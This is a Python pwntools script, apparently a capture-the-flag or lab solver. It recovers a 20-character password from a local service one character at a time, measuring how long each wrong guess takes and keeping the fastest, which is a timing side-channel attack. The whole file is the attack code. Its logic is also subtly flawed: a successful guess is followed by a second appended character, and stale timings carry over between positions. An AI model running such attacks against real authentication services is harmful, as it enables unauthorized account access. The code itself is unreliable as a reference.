from pwn import *
import time
import string

host = 'localhost'
port=4091

password = ""
dict_measurment = {}
while len(password) != 20:
    for ch in string.ascii_letters + string.digits:

        # Establish a remote connection
        p = remote(host, port)

        p.recv() # get all begin data
        log.info("Connected to")
        start=time.time()
        p.sendline(password + ch)
        res = p.recv().decode()
        end = time.time()
        if "WRONG" not in res:
            password += ch
            print(f"Found password: {password}")
            print("WOW")
            break
        print(f"for {ch} time is {end-start} seconds")
        dict_measurment[ch] = end - start

        p.close()
    min_key = min(dict_measurment, key=dict_measurment.get)
    print(f"min key is {min_key}")
    password += min_key

print(f"password is {password}")
